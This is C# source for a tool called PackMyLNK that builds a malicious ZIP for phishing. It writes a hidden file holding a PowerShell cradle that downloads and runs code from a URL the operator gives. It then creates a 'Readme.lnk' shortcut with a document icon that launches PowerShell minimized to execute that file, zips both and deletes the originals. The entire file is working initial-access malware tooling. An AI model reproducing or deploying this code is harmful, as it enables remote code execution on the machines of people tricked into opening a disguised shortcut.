using ICSharpCode.SharpZipLib.Core;
using ICSharpCode.SharpZipLib.Zip;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.WriteLine("Usage: .\\PackMyLNK.exe -Url <URL>");
            return;
        }

        string url = args[1];
        string curDir = AppDomain.CurrentDomain.BaseDirectory;
        string lnkFilePath = Path.Combine(curDir, "Readme.lnk");
        string ps1FilePath = Path.Combine(curDir, "backup.txt");
        string zipFilePath = Path.Combine(curDir, "Readme.zip");

        Console.WriteLine(@"
  _____           _    __  __       _      _   _ _  __
 |  __ \         | |  |  \/  |     | |    | \ | | |/ /
 | |__) |_ _  ___| | _| \  / |_   _| |    |  \| | ' / 
 |  ___/ _` |/ __| |/ / |\/| | | | | |    | . ` |  <  
 | |  | (_| | (__|   <| |  | | |_| | |____| |\  | . \ 
 |_|   \__,_|\___|_|\_\_|  |_|\__, |______|_| \_|_|\_\
                               __/ |                  
                              |___/                   
    calfcrusher@inventati.org
        ");


        Console.WriteLine("PackMyLNK - A simple .zip packer for LNK files");
        Console.WriteLine();
        Console.WriteLine();
        string psContent = $"Invoke-Expression -Command ([Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content))";

        File.WriteAllText(ps1FilePath, psContent);

        SetFileHidden(ps1FilePath);

        CreateShortcut(lnkFilePath, ps1FilePath);

        CreateZip(zipFilePath, new[] { lnkFilePath, ps1FilePath });

        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("ZIP file created: " + zipFilePath);
        Console.ResetColor();


        try
        {
            File.Delete(lnkFilePath);
            File.Delete(ps1FilePath);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error deleting files: " + ex.Message);
        }
    }

    static void CreateShortcut(string shortcutPath, string targetFilePath)
    {
        Type shellType = Type.GetTypeFromProgID("WScript.Shell")
                         ?? throw new InvalidOperationException("WScript.Shell is not available.");
        dynamic shell = Activator.CreateInstance(shellType)
                        ?? throw new InvalidOperationException("Failed to create WScript.Shell instance.");

        dynamic shortcut = shell.CreateShortcut(shortcutPath);
        if (shortcut == null) throw new InvalidOperationException("Failed to create shortcut.");

        // Set properties for the shortcut
        shortcut.TargetPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
        shortcut.Arguments = $"Get-Content .\\backup.txt | Invoke-Expression";
        shortcut.IconLocation = @"C:\Windows\System32\imageres.dll, 3";
        shortcut.WindowStyle = 7;
        shortcut.Save();
    }

    static void CreateZip(string zipFilePath, string[] filesToAdd)
    {
        using (FileStream fsOut = File.Create(zipFilePath))
        using (ZipOutputStream zipStream = new ZipOutputStream(fsOut))
        {
            zipStream.SetLevel(3);

            foreach (string file in filesToAdd)
            {
                FileInfo fi = new FileInfo(file);

                string entryName = ZipEntry.CleanName(fi.Name);
                ZipEntry newEntry = new ZipEntry(entryName)
                {
                    DateTime = fi.LastWriteTime,
                    Size = fi.Length,
                    ExternalFileAttributes = (int)fi.Attributes
                };

                zipStream.PutNextEntry(newEntry);

                using (FileStream fsInput = File.OpenRead(file))
                {
                    byte[] buffer = new byte[4096];
                    StreamUtils.Copy(fsInput, zipStream, buffer);
                }

                zipStream.CloseEntry();
            }
        }
    }

    static void SetFileHidden(string filePath)
    {
        FileAttributes attributes = File.GetAttributes(filePath);
        File.SetAttributes(filePath, attributes | FileAttributes.Hidden);
    }
}
